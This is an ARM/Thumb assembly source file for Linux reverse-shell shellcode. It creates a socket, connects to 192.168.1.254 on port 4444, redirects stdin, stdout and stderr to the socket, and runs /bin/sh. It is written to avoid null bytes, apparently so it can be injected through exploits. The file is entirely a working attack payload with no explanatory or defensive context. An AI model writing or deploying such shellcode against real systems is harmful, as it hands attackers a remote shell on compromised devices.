.section .text
.global _start
// The program starts here in (32-bit) ARM mode.
_start:
 
.ARM
    add r3, pc, #1
    bx r3
.THUMB
    //Create socket
    mov r7, #200
    add r7, #81
    mov r0, #2
    mov r1, #1
    sub r2,r2
    svc #1
    //Connect
    mov r4, r0
    mov r7, #255
    add r7, #28
    adr r1, struct
    strb r2, [r1, #1]
    adr r5, ipaddr
    strb r2, [r5, #2]
    mov r2, #16
    svc #1
    //DUP2 #stdin
    mov r0, r4
    mov r7, #63
    sub r1, r1
    svc #1
    //DUP2 # stdout
    mov r0, r4
    add r1, #1
    svc #1
    //DUP2 # stderr
    mov r0, r4
    add r1, #1
    svc #1
    //execve
    adr r0, binsh
    sub r1, r1
    sub r2, r2
    strb r2, [r0, #7]
    mov r7,  #11
    svc #1
    mov r1, r1
 
struct:
.ascii "\x02\xff" // AF_INET, replace 0xff with a 0x0
.ascii "\x11\x5c" // port 4444
ipaddr:
.byte 192,168,1,254
 
binsh:
.ascii "/bin/shX"
